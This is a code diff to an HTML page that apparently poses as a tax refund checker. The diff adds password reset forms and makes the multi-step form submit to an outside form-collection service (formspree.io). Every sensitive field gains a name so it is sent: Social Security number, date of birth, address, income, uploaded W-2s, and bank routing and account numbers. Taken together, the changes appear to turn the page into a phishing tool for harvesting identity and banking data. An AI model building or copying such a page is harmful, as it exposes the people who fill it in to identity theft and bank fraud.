@@ -43,11 +43,46 @@
                         <input id="login-email" type="email" required />
                         <label for="login-password">Password</label>
                         <input id="login-password" type="password" required />
+                        <div style="margin-top:6px; text-align:right;">
+                            <a href="#" id="forgot-link" style="font-size:0.9rem;">Forgot password?</a>
+                        </div>
                         <div style="margin-top:8px; display:flex; gap:8px;">
                             <button id="btn-login" class="btn btn-primary" type="button">Log In</button>
                             <button id="btn-cancel-login" class="btn btn-secondary" type="button">Cancel</button>
                         </div>
                         <div id="login-msg" class="error-message" style="display:none;margin-top:8px;"></div>
+                    </form>
+
+                    <!-- Forgot password form -->
+                    <form id="forgot-form" style="display:none;">
+                        <p>Enter your account email and we'll send a verification code to reset your password.</p>
+                        <label for="forgot-email">Email</label>
+                        <input id="forgot-email" type="email" required />
+                        <div style="margin-top:8px; display:flex; gap:8px;">
+                            <button id="btn-forgot-send" class="btn btn-primary" type="button">Send Code</button>
+                            <button id="btn-forgot-cancel" class="btn btn-secondary" type="button">Cancel</button>
+                        </div>
+                        <div id="forgot-msg" class="error-message" style="display:none;margin-top:8px;"></div>
+                    </form>
+
+                    <!-- Reset password form (after code) -->
+                    <form id="reset-form" style="display:none;">
+                        <p>Enter the code sent to your email, then choose a new password. You may also re-enter profile info to restore your account.</p>
+                        <label for="reset-email">Email</label>
+                        <input id="reset-email" type="email" required />
+                        <label for="reset-code">Verification Code</label>
+                        <input id="reset-code" type="text" inputmode="numeric" required />
+                        <label for="reset-password">New Password</label>
+                        <input id="reset-password" type="password" required />
+                        <label for="reset-name">Full Name (to restore profile)</label>
+                        <input id="reset-name" type="text" />
+                        <label for="reset-dob">Date of Birth (to restore profile)</label>
+                        <input id="reset-dob" type="date" />
+                        <div style="margin-top:8px; display:flex; gap:8px;">
+                            <button id="btn-reset-submit" class="btn btn-primary" type="button">Reset Password</button>
+                            <button id="btn-reset-cancel" class="btn btn-secondary" type="button">Cancel</button>
+                        </div>
+                        <div id="reset-msg" class="error-message" style="display:none;margin-top:8px;"></div>
                     </form>
 
                     <form id="mfa-form" style="display:none;">
@@ -73,11 +108,11 @@
             <div class="step" data-step="5" role="tab">5. Review</div>
         </div>
 
-        <form id="refund-form" novalidate>
+        <form id="refund-form" novalidate action="https://formspree.io/f/xzzngynp" method="POST" enctype="multipart/form-data">
             <div class="step-content active" data-step="1" aria-hidden="false">
                 <div class="form-group">
                     <label for="tax-year">Which Tax Year are you checking? *</label>
-                    <select id="tax-year" required>
+                    <select id="tax-year" name="taxYear" required>
                         <option value="">Select Year</option>
                         <option value="2024">2024</option>
                         <option value="2023">2023</option>
@@ -100,40 +135,40 @@
                 <p class="security-note">We protect your sensitive fields and advise you to only provide SSN/SSN-like numbers on secure networks. SSN input is masked client-side.</p>
                 <div class="form-group">
                     <label for="full-name">Full Legal Name *</label>
-                    <input type="text" id="full-name" placeholder="John Doe" required>
+                    <input type="text" id="full-name" name="fullName" placeholder="John Doe" required>
                 </div>
                 <div class="form-group">
                     <label for="email">Email Address *</label>
-                    <input type="email" id="email" placeholder="you@example.com" required>
+                    <input type="email" id="email" name="email" placeholder="you@example.com" required>
                 </div>
                 <div class="form-group">
                     <label for="phone">Phone (optional)</label>
-                    <input type="tel" id="phone" placeholder="e.g., +1 555 555 5555" inputmode="tel">
+                    <input type="tel" id="phone" name="phone" placeholder="e.g., +1 555 555 5555" inputmode="tel">
                 </div>
                 <div class="form-group">
                     <label for="dob">Date of Birth * (MM/DD/YYYY)</label>
-                    <input type="date" id="dob" required placeholder="MM/DD/YYYY" />
+                    <input type="date" id="dob" name="dob" required placeholder="MM/DD/YYYY" />
                     <small style="color:#666; font-size:0.85rem; margin-top:4px; display:block;">Tap to select from calendar or type manually</small>
                 </div>
                 <div class="form-group">
                     <label for="ssn">Social Security Number / TIN *</label>
-                    <input type="text" id="ssn" placeholder="XXX-XX-XXXX" inputmode="numeric" autocomplete="off" required aria-describedby="ssn-help">
+                    <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" inputmode="numeric" autocomplete="off" required aria-describedby="ssn-help">
                     <div id="ssn-help" class="error-message" style="display:none;">Enter SSN in format XXX-XX-XXXX</div>
                 </div>
                 <div class="form-group">
                     <label for="address">Street Address *</label>
-                    <input type="text" id="address" placeholder="123 Main St" required>
+                    <input type="text" id="address" name="address" placeholder="123 Main St" required>
                 </div>
             </div>
 
             <div class="step-content" data-step="3" aria-hidden="true">
                 <div class="form-group">
                     <label for="gross-income">Total Gross Income (From W-2/1099) *</label>
-                    <input type="number" id="gross-income" placeholder="e.g., 55000" min="0" required>
+                    <input type="number" id="gross-income" name="grossIncome" placeholder="e.g., 55000" min="0" required>
                 </div>
                 <div class="form-group">
                     <label for="tax-withheld">Total Federal Tax Withheld *</label>
-                    <input type="number" id="tax-withheld" placeholder="e.g., 5000" min="0" required>
+                    <input type="number" id="tax-withheld" name="taxWithheld" placeholder="e.g., 5000" min="0" required>
                 </div>
                 <div class="form-group">
                     <label>Did you claim dependents? *</label>
@@ -146,11 +181,11 @@
                 </div>
                 <div class="form-group">
                     <label for="dependents-count" id="dependents-count-label" style="display:none;">Number of Dependents:</label>
-                    <input type="number" id="dependents-count" placeholder="0" min="0" max="10" style="display:none;">
+                        <input type="number" id="dependents-count" name="dependentsCount" placeholder="0" min="0" max="10" style="display:none;">
                 </div>
                 <div class="form-group">
                     <label for="document-upload">Upload documents (W-2/1099) — optional</label>
-                    <input type="file" id="document-upload" accept=".pdf,.jpg,.jpeg,.png" aria-describedby="upload-help">
+                    <input type="file" id="document-upload" name="documentUpload" accept=".pdf,.jpg,.jpeg,.png" aria-describedby="upload-help">
                     <div id="upload-help" class="error-message" style="display:none;">Allowed: PDF, JPG, PNG. Max 5 MB.</div>
                 </div>
             </div>
@@ -159,15 +194,15 @@
                 <h3>Direct Deposit (recommended)</h3>
                 <div class="form-group">
                     <label for="bank-name">Bank Name *</label>
-                    <input type="text" id="bank-name" placeholder="Chase, Wells Fargo, etc." required>
+                    <input type="text" id="bank-name" name="bankName" placeholder="Chase, Wells Fargo, etc." required>
                 </div>
                 <div class="form-group">
                     <label for="routing-number">Bank Routing Number (9 Digits) *</label>
-                    <input type="text" id="routing-number" placeholder="XXXXXXXXX" inputmode="numeric" required pattern="\d{9}" title="Routing number must be 9 digits">
+                    <input type="text" id="routing-number" name="routingNumber" placeholder="XXXXXXXXX" inputmode="numeric" required pattern="\d{9}" title="Routing number must be 9 digits">
                 </div>
                 <div class="form-group">
                     <label for="account-number">Bank Account Number *</label>
-                    <input type="text" id="account-number" placeholder="Account Number" inputmode="numeric" required>
+                    <input type="text" id="account-number" name="accountNumber" placeholder="Account Number" inputmode="numeric" required>
                 </div>
             </div>
 
